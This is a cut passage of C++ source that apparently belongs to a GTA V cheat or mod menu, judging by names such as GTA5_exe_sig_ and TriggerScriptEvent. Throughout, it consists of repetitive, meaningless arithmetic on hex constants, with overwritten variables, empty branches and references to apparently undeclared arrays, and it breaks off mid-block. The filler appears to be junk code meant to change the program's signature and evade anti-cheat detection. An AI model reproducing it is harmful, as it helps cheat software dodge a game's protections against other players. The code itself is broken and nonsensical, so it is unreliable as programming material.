					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = 0xB2 * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					if (matriz[1] > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					a = 0.0f;
					b = 0.0f;
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (5) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					a = 0.0f;
					b = 0.0f;
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						std::string a = Extern_Reader::StringManager::ReplaceWord(token, "<Roll>", "");
						a = Extern_Reader::StringManager::ReplaceWord(a, "</Roll>", "");

						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
